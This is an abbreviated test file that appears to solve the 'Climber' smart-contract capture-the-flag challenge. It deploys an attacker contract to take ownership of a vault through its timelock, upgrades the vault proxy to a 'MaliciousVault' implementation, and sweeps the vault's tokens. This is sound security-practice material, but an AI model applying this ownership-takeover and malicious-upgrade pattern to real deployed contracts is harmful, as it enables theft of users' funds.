...
describe('[Challenge] Climber', function () {
    ...
    it('Exploit', async function () {
        ...
        this.attack = await (await ethers.getContractFactory('Attacker12', attacker)).deploy(
            this.timelock.address,
            this.vault.address,
            await attacker.getAddress()
        )
        await this.attack.attack();
        expect(await this.vault.owner()).to.eq(await attacker.getAddress());

        const maliciousImpl = await ethers.getContractFactory('MaliciousVault', attacker);
        this.updatedVault = await upgrades.upgradeProxy(
            this.vault.address,
            maliciousImpl
        );

        await this.updatedVault.sweepFunds(this.token.address);
    });
